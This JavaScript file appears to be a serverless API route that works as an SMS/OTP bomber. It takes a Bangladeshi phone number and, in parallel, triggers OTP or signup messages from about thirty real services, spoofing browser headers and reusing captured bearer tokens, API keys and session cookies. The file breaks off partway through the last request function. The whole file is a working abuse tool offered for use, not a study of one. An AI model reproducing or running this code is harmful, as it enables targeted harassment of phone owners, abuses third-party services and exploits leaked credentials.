// pages/api/combined-otp.js
export default async function handler(req, res) {
  // Set response timeout (Vercel has a 10s timeout for free tier)
  res.setTimeout(9000, () => {
    res.status(504).json({ error: "Request timeout" });
  });

  // Check if the request method is GET or POST
  if (req.method !== "GET" && req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  // Extract the phone number from the request
  const phone = req.method === "POST" ? req.body.phone : req.query.phone || req.query.number;

  if (!phone) {
    return res.status(400).json({ error: "Phone number is required." });
  }

  // Validate phone number format
  if (!/^(?:\+?88)?01[3-9]\d{8}$/.test(phone)) {
    return res.status(400).json({ error: "Invalid Bangladeshi phone number format" });
  }

  try {
    // Create a controller for the fetch requests
    const controller = new AbortController();
    const { signal } = controller;
    const timeoutId = setTimeout(() => controller.abort(), 8000);

    // Prepare all API calls with proper error handling
    const apiCalls = [
      callApiSafely(callMeena, phone, signal),
      callApiSafely(callMotion, phone, signal),
      callApiSafely(callPaperfly, phone, signal),
      callApiSafely(callRabbit, phone, signal),
      callApiSafely(callSikho, phone, signal),
      callApiSafely(callSwap, phone, signal),
      callApiSafely(callRed, phone, signal),
      callApiSafely(callToffe, phone, signal),
      callApiSafely(callWalton, phone, signal),
      callApiSafely(callOsudh, phone, signal),
      callApiSafely(callAdmission, phone, signal),
      callApiSafely(callAroggo, phone, signal),
      callApiSafely(callBinge, phone, signal),
      callApiSafely(callChokro, phone, signal),
      callApiSafely(callChorki, phone, signal),
      callApiSafely(callBus, phone, signal),
      callApiSafely(callDeepto, phone, signal),
      callApiSafely(callFlipper, phone, signal),
      callApiSafely(callFundesh, phone, signal),
      callApiSafely(callGhoori, phone, signal),
      callApiSafely(callHoicoi, phone, signal),
      callApiSafely(callHoicoi2, phone, signal),
      callApiSafely(callIscreen, phone, signal),
      callApiSafely(callJatri, phone, signal),
      callApiSafely(callJotno, phone, signal),
      callApiSafely(callKormi, phone, signal),
      callApiSafely(callLaaz, phone, signal),
      callApiSafely(callMed, phone, signal),
      callApiSafely(callKire, phone, signal),
      callApiSafely(callBioscope, phone, signal)
    ];

    // Execute all API calls in parallel
    const results = await Promise.all(apiCalls);
    clearTimeout(timeoutId);

    // Structure the response
    const response = {
      meena: results[0],
      motion: results[1],
      paperfly: results[2],
      rabbit: results[3],
      sikho: results[4],
      swap: results[5],
      red: results[6],
      toffe: results[7],
      walton: results[8],
      osudh: results[9],
      admission: results[10],
      aroggo: results[11],
      binge: results[12],
      chokro: results[13],
      chorki: results[14],
      bus: results[15],
      deepto: results[16],
      flipper: results[17],
      fundesh: results[18],
      ghoori: results[19],
      hoicoi: results[20],
      hoicoi2: results[21],
      iscreen: results[22],
      jatri: results[23],
      jotno: results[24],
      kormi: results[25],
      laaz: results[26],
      med: results[27],
      kire: results[28],
      bioscope: results[29],
      timestamp: new Date().toISOString()
    };

    return res.status(200).json(response);
  } catch (error) {
    console.error('Combined API Error:', error);
    return res.status(500).json({ 
      error: "Failed to process some requests",
      details: error.message,
      stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
    });
  }
}

// Wrapper function for safe API calls
async function callApiSafely(apiFunction, phone, signal) {
  try {
    const response = await apiFunction(phone, signal);
    return {
      success: true,
      data: response,
      timestamp: new Date().toISOString()
    };
  } catch (error) {
    return {
      success: false,
      error: error.message,
      service: apiFunction.name.replace('call', ''),
      timestamp: new Date().toISOString()
    };
  }
}

// ========== API FUNCTIONS ========== //

// From bomber6.js
async function callMeena(phone, signal) {
    const url = "https://easybill.zatiq.tech/api/auth/v1/send_otp";
    const data = {
        code: "+880",
        country_code: "BD",
        phone: phone,
        is_existing_user: false
    };

    const headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7",
        "application-type": "Merchant",
        "content-type": "application/json",
        "device-type": "Web",
        "origin": "https://merchant.zatiqeasy.com",
        "priority": "u=1, i",
        "referer": "https://merchant.zatiqeasy.com/",
        "sec-ch-ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(data),
            signal
        });
        return await response.json();
    } catch (error) {
        return { status: "error", message: error.message };
    }
}

async function callMotion(phone, signal) {
    const url = "https://api.motionview.com.bd/api/send-otp-phone-signup";
    const data = { phone: phone };

    const headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7",
        "content-type": "application/json",
        "origin": "https://motionview.com.bd",
        "referer": "https://motionview.com.bd/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "sec-ch-ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site"
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(data),
            signal
        });
        return await response.json();
    } catch (error) {
        return { status: "error", message: error.message };
    }
}

async function callPaperfly(phone, signal) {
    const url = "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php";
    const data = {
        full_name: "Adil rashid",
        company_name: "Abu rahim",
        email_address: "webhosttcs@gmail.com",
        phone_number: phone
    };

    const headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
        'content-type': 'application/json',
        'device_identifier': 'undefined',
        'device_name': 'undefined',
        'origin': 'https://go.paperfly.com.bd',
        'priority': 'u=1, i',
        'referer': 'https://go.paperfly.com.bd/',
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(data),
            signal
        });
        return await response.json();
    } catch (error) {
        return { status: "error", message: error.message };
    }
}

async function callRabbit(phone, signal) {
    const mobile = '+88' + phone;
    const url = 'https://apix.rabbitholebd.com/appv2/login/requestOTP';
    const data = { mobile: mobile };

    const headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7",
        "content-type": "application/json",
        "current-time": "1744902669",
        "hash": "383690c27042ef63429357d9e82fd7846266075567c3017f5e3da4345e7b3a56",
        "origin": "https://www.rabbitholebd.com",
        "priority": "u=1, i",
        "referer": "https://www.rabbitholebd.com/",
        "sec-ch-ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(data),
            signal
        });
        return await response.json();
    } catch (error) {
        return { status: "error", message: error.message };
    }
}

async function callSikho(phone, signal) {
    const fullPhone = '880' + phone.replace(/^0/, '');
    const url = 'https://api.shikho.com/auth/v2/send/sms';
    const data = {
        phone: fullPhone,
        type: 'student',
        auth_type: 'signup',
        vendor: 'shikho'
    };

    const headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.shikho.com',
        'priority': 'u=1, i',
        'referer': 'https://www.shikho.com/',
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(data),
            signal
        });
        return await response.json();
    } catch (error) {
        return { status: "error", message: error.message };
    }
}

async function callSwap(phone, signal) {
    const url = 'https://api.swap.com.bd/api/v1/send-otp/v2';
    const data = { phone: phone };

    const headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://swap.com.bd',
        'Referer': 'https://swap.com.bd/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'signature': '9d5cgzPGfnrKujXhtbho7vljOG+MxantzkvRUrUJCpY='
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(data),
            signal
        });
        return await response.json();
    } catch (error) {
        return { status: "error", message: error.message };
    }
}

async function callRed(phone, signal) {
    const url = "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp";
    const data = { phoneNumber: phone };

    const headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7",
        "content-type": "application/json",
        "origin": "https://redx.com.bd",
        "priority": "u=1, i",
        "referer": "https://redx.com.bd/",
        "sec-ch-ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
    };

    const cookies = "_ga_DVN5RVT5NY=GS1.1.1744905912.1.0.1744905912.60.0.0; _ga=GA1.1.1205938136.1744905913; _fbp=fb.2.1744905912788.67493150317867107; _ga_ZTN98XM7BX=GS1.1.1744905913.1.0.1744905913.60.0.0";

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                ...headers,
                Cookie: cookies
            },
            body: JSON.stringify(data),
            signal
        });
        return await response.json();
    } catch (error) {
        return { status: "error", message: error.message };
    }
}

async function callToffe(phone, signal) {
    const formattedPhone = '880' + phone.replace(/^\+880/, '');
    const url = "https://prod-services.toffeelive.com/sms/v1/subscriber/otp";
    const data = {
        target: formattedPhone,
        resend: false
    };

    const headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
        'authorization': 'Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJodHRwczovL3RvZmZlZWxpdmUuY29tIiwiY291bnRyeSI6IkJEIiwiZF9pZCI6ImI3ZmMxYTMwLWY4YWEtNDcxMS04NjlkLTdiODE0NDI1YmY5NyIsImV4cCI6MTc0NDkyMzQ2NywiaWF0IjoxNzQ0OTAxODY3LCJpc3MiOiJ0b2ZmZWVsaXZlLmNvbSIsImp0aSI6Ijk2NDhmMzQwLWU0NGItNDM2My04NTIxLTEwOTcwMGQyNjg3Nl8xNzQ0OTAxODY3IiwicHJvdmlkZXIiOiJ0b2ZmZWUiLCJyX2lkIjoiYjdmYzFhMzAtZjhhYS00NzExLTg2OWQtN2I4MTQ0MjViZjk3Iiwic19pZCI6ImI3ZmMxYTMwLWY4YWEtNDcxMS04NjlkLTdiODE0NDI1YmY5NyIsInRva2VuIjoiYWNjZXNzIiwidHlwZSI6ImRldmljZSJ9.nvocuo1f4wXtUETxW2kMFey3Gccv4c5_2HFJsiK8dG_duqcGwYEzY3xm79IzzTECN_0cXK8PqCfZ7RlDz1bLdQ',
        'cache-control': 'max-age=0',
        'content-type': 'application/json',
        'origin': 'https://toffeelive.com',
        'priority': 'u=1, i',
        'referer': 'https://toffeelive.com/',
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(data),
            signal
        });
        return await response.json();
    } catch (error) {
        return { status: "error", message: error.message };
    }
}

async function callWalton(phone, signal) {
    const url = "https://waltonplaza.com.bd/api/auth/otp/create";
    const data = {
        auth: {
            countryCode: "880",
            deviceUuid: "ba7834a0-1b7c-11f0-ad2b-d73d21afdc21",
            phone: phone,
            type: "LOGIN"
        },
        captchaToken: "no recapcha"
    };

    const headers = {
        "accept": "*/*",
        "accept-language": "en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7",
        "content-type": "application/json",
        "origin": "https://waltonplaza.com.bd",
        "priority": "u=1, i",
        "referer": "https://waltonplaza.com.bd/auth/phone-login",
        "sec-ch-ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
        "cookie": "selectedArea=%7B%22area%22%3A%7B%7D%2C%22isDummySelectedArea%22%3Atrue%2C%22locationType%22%3A%22CURRENT_LOCATION%22%7D; _gcl_au=1.1.1657914934.1744888289; _fbp=fb.2.1744888289561.44530208368918440; _ga=GA1.1.417859319.1744888290; device-uuid=ba7834a0-1b7c-11f0-ad2b-d73d21afdc21; _ga_91FHYEDXE9=GS1.1.1744888289.1.1.1744888310.0.0.0"
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(data),
            signal
        });
        return await response.json();
    } catch (error) {
        return { status: "error", message: error.message };
    }
}

async function callOsudh(phone, signal) {
    const mobile = '+88-' + phone;
    const url = 'https://api.osudpotro.com/api/v1/users/send_otp';
    const data = {
        mobile: mobile,
        deviceToken: "web",
        language: "en",
        os: "web"
    };

    const headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://osudpotro.com",
        "priority": "u=1, i",
        "referer": "https://osudpotro.com/",
        "sec-ch-ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(data),
            signal
        });
        return await response.json();
    } catch (error) {
        return { status: "error", message: error.message };
    }
}

// From boom.js
async function callAdmission(phone, signal) {
  const url = 'https://www.admissionbd.net/e-commerce-ajax-files/mobile-verify.php';
  const postData = `PrimaryMobile=${encodeURIComponent(phone)}&verify=1`;

  const response = await fetch(url, {
    method: 'POST',
    signal,
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Origin': 'https://www.admissionbd.net',
      'Referer': 'https://www.admissionbd.net/signin',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
      'Cookie': 'PHPSESSID=c002rpn9cvu6au090fh4tnlh7k; _fbp=fb.1.1744905387338.61219556320130605'
    },
    body: postData
  });

  if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
  return response.text();
}

async function callAroggo(phone, signal) {
  const url = "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=134.0.0.0&os=Windows&osv=10";
  
  const formData = new URLSearchParams();
  formData.append('mobile', phone);
  formData.append('fcmToken', '');
  formData.append('referral', '');

  const response = await fetch(url, {
    method: 'POST',
    signal,
    headers: {
      "accept": "*/*",
      "accept-language": "en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7",
      "content-type": "application/x-www-form-urlencoded",
      "origin": "https://www.arogga.com",
      "referer": "https://www.arogga.com/",
      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
    },
    body: formData
  });

  if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
  return response.json();
}

async function callBinge(phone, signal) {
  const formattedPhone = phone.startsWith('+880') ? phone : `+880${phone}`;
  const url = `https://web-api.binge.buzz/api/v3/otp/send/${encodeURIComponent(formattedPhone)}`;

  const response = await fetch(url, {
    method: 'GET',
    signal,
    headers: {
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
      'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJGcmVlIiwiY3JlYXRlZEF0IjoiY3JlYXRlIGRhdGUiLCJ1cGRhdGVkQXQiOiJ1cGRhdGUgZGF0ZSIsInR5cGUiOiJ0b2tlbiIsImRldlR5cGUiOiJ3ZWIiLCJleHRyYSI6IjMxNDE1OTI2IiwiaWF0IjoxNzQ0ODgwOTY1LCJleHAiOjE3NDUwNTM3NjV9.KHV44u9Lzv55ARaVMe1QQ5v5vLkGDiT9PvkW5cFUXII',
      'Device-Type': 'web',
      'Origin': 'https://binge.buzz',
      'Referer': 'https://binge.buzz/',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
    }
  });

  if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
  return response.json();
}

async function callChokro(phone, signal) {
  const url = 'https://chokrojan.com/api/v1/passenger/login/mobile';
  const data = JSON.stringify({ mobile_number: phone });

  const response = await fetch(url, {
    method: 'POST',
    signal,
    headers: {
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
      'Authorization': 'Bearer null',
      'Content-Type': 'application/json;charset=UTF-8',
      'Origin': 'https://chokrojan.com',
      'Referer': 'https://chokrojan.com/login',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
      'company-id': '1',
      'domain-name': 'chokrojan.com',
      'user-platform': '3'
    },
    body: data
  });

  if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
  return response.text();
}

async function callChorki(phone, signal) {
  const url = "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en";
  const payload = JSON.stringify({ phone });

  const response = await fetch(url, {
    method: 'POST',
    signal,
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Origin": "https://www.chorki.com",
      "Referer": "https://www.chorki.com/",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
    },
    body: payload
  });

  if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
  return response.json();
}

async function callBus(phone, signal) {
  const url = 'https://api.busbd.com.bd/api/auth';
  const data = JSON.stringify({ phone });

  const response = await fetch(url, {
    method: 'POST',
    signal,
    headers: {
      'accept': 'application/json, text/plain, */*',
      'content-type': 'application/json',
      'origin': 'https://busbd.com.bd',
      'referer': 'https://busbd.com.bd/',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
    },
    body: data
  });

  if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
  return response.json();
}

async function callDeepto(phone, signal) {
  const formattedPhone = phone.startsWith('+880') ? phone : `+880${phone}`;
  const url = 'https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en';
  const data = JSON.stringify({ number: formattedPhone });

  const response = await fetch(url, {
    method: 'POST',
    signal,
    headers: {
      'accept': 'application/json',
      'content-type': 'application/json',
      'origin': 'https://www.deeptoplay.com',
      'referer': 'https://www.deeptoplay.com/',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
    },
    body: data
  });

  if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
  return response.text();
}

async function callFlipper(phone, signal) {
  const url = "https://portal.flipper.com.bd/api/v1/send-otp/login";
  const data = JSON.stringify({ mobile_number: phone });

  const response = await fetch(url, {
    method: 'POST',
    signal,
    headers: {
      "Accept": "application/json, text/plain, */*",
      "Content-Type": "application/json",
      "Origin": "https://flipper.com.bd",
      "Referer": "https://flipper.com.bd/",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
      "X-Authorization": "QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3",
      "X-Otp-Auth": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3ZWIiOiJ0cnVlIiwicGxhdGZvcm0iOiJjaGFybWluZ3dlYiIsImlhdCI6MTc0NDkwOTA5OCwiZXhwIjoxNzQ0OTE2Mjk4fQ.5CkSegMxgbstpG1AsfIHchzBwT2Wz6cTOiL-UU5f2w4"
    },
    body: data
  });

  if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
  return response.json();
}

async function callFundesh(phone, signal) {
  const url = 'https://fundesh.com.bd/api/auth/generateOTP?service_key=';
  const payload = JSON.stringify({ msisdn: phone });

  const response = await fetch(url, {
    method: 'POST',
    signal,
    headers: {
      "accept": "application/json, text/plain, */*",
      "content-type": "application/json; charset=UTF-8",
      "origin": "https://fundesh.com.bd",
      "referer": "https://fundesh.com.bd/fundesh/profile",
      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
      "Cookie": '_gid=GA1.3.992819867.1744905836; _gat_UA-146796176-2=1; _fbp=fb.2.1744905835932.560245964539210327; __gads=ID=6755eecba3780380:T=1744905836:RT=1744905836:S=ALNI_MazbePNmx6nKGVlMkdaPvXveOVL8w; __gpi=UID=000010a2bd3caca6:T=1744905836:RT=1744905836:S=ALNI_MZxEnej5m00Z8IUYH0edHTM-HKtsw; __eoi=ID=482d3ae45805132d:T=1744905837:RT=1744905837:S=AA-AfjZpw3P9gSx3LtKgQ7cfrkAq; FCNEC=%5B%5B%22AKsRol_30joTYoKGK52jke-uS5Hffnnlssb4VQRyxN4TupcXvQcdBC0c2axru7horhBxeEThUctDXCL7j0eU6lswQFr_NS317QXhy7UoyIUWW_uu5ySudP35ucCxquvnppdpj9Cv-WpQVzbkUQJoVhV461WaQVf4BA%3D%3D%22%5D%5D; _ga=GA1.3.1856865864.1744905836; _ga_5LF4359FD3=GS1.1.1744905836.1.1.1744905855.41.0.0'
    },
    body: payload
  });

  if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
  return response.json();
}

async function callGhoori(phone, signal) {
  const url = 'https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web';
  const data = JSON.stringify({ mobile_no: phone });

  const response = await fetch(url, {
    method: 'POST',
    signal,
    headers: {
      'accept': 'application/json, text/plain, */*',
      'content-type': 'application/json',
      'origin': 'https://ghoorilearning.com',
      'referer': 'https://ghoorilearning.com/',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
    },
    body: data
  });

  if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
  return response.json();
}

async function callHoicoi(phone, signal) {
  const formattedPhone = phone.startsWith('+880') ? phone : `+880${phone}`;
  const url = 'https://prod-api.viewlift.com/identity/signup?site=hoichoitv&deviceId=browser-477f3707-1e17-d9cd-e31e-1135ee020dbc';
  const data = JSON.stringify({
    phoneNumber: formattedPhone,
    requestType: 'send',
    whatsappConsent: true
  });

  const response = await fetch(url, {
    method: 'POST',
    signal,
    headers: {
      'accept': 'application/json, text/plain, */*',
      'content-type': 'application/json',
      'origin': 'https://www.hoichoi.tv',
      'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
    },
    body: data
  });

  if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
  return response.json();
}

async function callHoicoi2(phone, signal) {
  const formattedPhone = phone.startsWith('+880') ? phone : `+880${phone}`;
  const url = 'https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-87b5fbdc-e54f-0d18-28c9-b22ce1929297';
  const data = JSON.stringify({
    phoneNumber: formattedPhone,
    requestType: 'send',
    screenName: 'signin'
  });

  const response = await fetch(url, {
    method: 'POST',
    signal,
    headers: {
      'accept': 'application/json, text/plain, */*',
      'content-type': 'application/json',
      'origin': 'https://www.hoichoi.tv',
      'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
    },
    body: data
  });

  if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
  return response.json();
}

async function callIscreen(phone, signal) {
  const formattedPhone = phone.startsWith('+880') ? phone : `+880${phone}`;
  const url = 'https://api.rockstreamer.com/otp/api/v1/phone/otp';
  const data = JSON.stringify({
    phone_number: formattedPhone
  });

  const response = await fetch(url, {
    method: 'POST',
    signal,
    headers: {
      'accept': 'application/json, text/plain, */*',
      'content-type': 'application/json',
